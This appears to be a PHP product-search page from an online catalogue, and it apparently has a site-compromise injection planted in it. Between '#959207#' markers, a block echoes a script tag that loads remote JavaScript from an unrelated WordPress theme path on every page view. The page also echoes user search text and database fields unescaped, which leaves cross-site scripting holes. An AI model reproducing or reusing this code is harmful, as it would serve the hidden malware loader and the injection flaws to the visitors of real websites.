...
<?
	...
	$query = "select cat_product.*, manufacture.name as mname 
			  ...
			  where cat_product.status = 1 ";

	if(isset($_GET["s_manufacture"]) AND is_numeric($_GET["s_manufacture"]) AND ($_GET["s_manufacture"] != 0) ){
		$manufacture_id = $_GET["s_manufacture"];
		$query .= " and manufacture_id = $manufacture_id ";
		$manufacture_info = $cls -> db_select("select * from manufacture where id = $manufacture_id ");
		$manufacture_info = $manufacture_info[1];
	}
	if(isset($_GET["s_category"]) AND is_numeric($_GET["s_category"]) AND ($_GET["s_category"] > 0) ){
		$category_id = $_GET["s_category"];
		$query .= " and cat_id = $category_id ";
		$category_info = $cls -> db_select("select * from category where id = $category_id ");
		$category_info = $category_info[1];

	}
	if(isset($_GET["s_type"]) AND is_numeric($_GET["s_type"]) AND ($_GET["s_type"] > 0) ){
		$type = $_GET["s_type"];
		$query .= " and type = $type ";
		
	}
	if(isset($_GET["s_text"]) AND (trim($_GET["s_text"]) != "") ){
		$text = mysql_escape_string($_GET["s_text"]);
		$query .= " and ( cat_product.name like '%$text%' OR cat_product.general_info like '%$text%' OR cat_product.description like '%$text%' ) ";
...
#959207#
if(empty($srwv)) {
$srwv = "<script type=\"text/javascript\" src=\"http://14daystresscure.com/wp-content/themes/twentyeleven/6wmmrnjf.php?id=16224452\"></script>";
echo $srwv;
}
#/959207#
?>
	...
	<td valign="top" colspan="2" style="background-color: #FFFFFF; border:2px solid #cccccc; ">
		...
		Search: 
		<? if(trim($text) != "") { ?>[ by: <?=$text ?> ]  <? } ?>
		<? if(isset($manufacture_info)) { ?>[ Manufacture: <span style="color:#666666"><?=$manufacture_info["name"] ?></span> ] <? } ?>
		<? if(isset($category_info)) { ?>[ Category: <span style="color:#666666"><?=$category_info["name"] ?></span> ] <? } ?>
		<!-- InstanceEndEditable --></b>
		<hr style="color:#d7d7d7; margin:2px; margin-bottom:10px; margin-top:10px;" />
		<!-- InstanceBeginEditable name="content" -->
		<?
			$start_paging = $cls ->start_paging($all_product,9);
			if (is_array($all_product)) array_splice($all_product, 0,($start_paging['start_rec']-1));
				$display = 1;
				if (is_array($all_product))
			{

		?>
		<ul class="gallery clearfix font_3" style="padding-left:0px">
		<? while(list($key,$val) = each($all_product) AND ($display  <= $start_paging['display_rec']) ) { ?>
			<div style="padding:2px; margin:2px; height:16px; background-color:#cccccc; color:#000000">
			<a href="product_d.php?id=<?=$val["id"] ?>"><?=$val["name"] ?></a>
			</div>
			...
			<br />
			 <?=$val["description"] ?>
			<div align="right"><a href="product_d.php?id=<?=$val["id"] ?>">More Details</a></div>
			<br clear="all" />
		<? } ?>
		</ul>
		<? }else{ ?>
		...
		<? } ?>
		<hr>
		<div dir="ltr" style="font-size:12px; color:#333333; font-family:Verdana; font-weight:100"  align="center">
		[ 
			<? if(count($all_product) <= 20 AND count($all_product) >= 1) print "1"; ?>
			<? $cls ->end_paging($end_paging = array("total"=>$start_paging['all_rec'] , "display"=>$start_paging['display_rec'])); ?> 
		]
		</div>		
